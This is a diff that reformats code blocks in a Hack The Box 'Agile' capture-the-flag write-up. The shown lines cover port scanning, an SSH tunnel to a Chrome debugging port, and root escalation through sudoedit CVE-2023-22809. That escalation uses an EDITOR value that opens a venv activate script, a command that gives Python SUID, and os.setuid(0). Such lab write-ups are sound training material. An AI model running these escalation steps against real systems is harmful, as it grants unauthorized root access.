@@ -8,9 +8,10 @@ https://app.hackthebox.com/machines/Agile
 
 I started with a quick rustscan and found only two open ports: 22 and 80.
 
-```
+```bash
 sudo rustscan -a 10.10.11.203 -- -sC -sV -T4 -vv -oN agile_nmap
-
+```
+```
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -77,7 +78,7 @@ I tried to extract the file using LFI and successfully obtained the source code 
 
 Here is the full source code of the file :
 
-```
+```python3
 import flask
 import subprocess
 from flask_login import login_required, current_user
@@ -238,8 +239,10 @@ To perform port forwarding I tried 'Chisel' but for some reason the Agile box is
 
 I then attempted to perform port forwarding using SSH:
 
-    ssh corum@10.10.11.203 -L 41829:127.0.0.1:41829
-    
+```bash
+ssh corum@10.10.11.203 -L 41829:127.0.0.1:41829
+```
+
 Since the service is running the Chrome remote debugging, we can directly open the Chrome/Chromium browser and access the dev tool tab using "chrome://inspect". In the configure section, we can add our listening port 41829 to see the content.
 
 ![image](https://user-images.githubusercontent.com/87700008/223483817-40753927-e43a-4f1e-9261-d037cc8f7287.png)
@@ -276,21 +279,25 @@ CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2
 
 As per the blog "This behavior leads to confusion when injecting an extra double dash in the previous environment variables used to look up the editor."
 
-    EDITOR='vim -- /path/to/extra/file'
-    
+```bash
+EDITOR='vim -- /path/to/extra/file'
+```
+
 By modifying the EDITOR environment variable, we can open an additional file in the same way.
 
 We export the variable as indicated by opening /app/venv/bin/activate as an extra file :
 
-    export EDITOR='vim -- /app/venv/bin/activate'
-    
+```bash
+export EDITOR='vim -- /app/venv/bin/activate'
+```
+
 We can open one of the 2 files that allows us to open as dev_admin at the sudoers level.
 
 ![image](https://user-images.githubusercontent.com/87700008/223765305-3cebc26b-fed4-4a7d-877f-32ec1ea76cd9.png)
 
 To modify the file, we added a command at the beginning to grant suid permissions to Python.
 
-```
+```bash
 # This file must be used with "source bin/activate" *from bash*
 # you cannot run it directly
 
@@ -303,7 +310,7 @@ The save the file using 'wq!' and after sometime the file will be executed and p
 
 Using Python3, we set our uid to '0' and then used 'su' to become root :
 
-```
+```python3
 edwards@agile:~$ python3 -q
 >>> import os
 >>> os.setuid(0)
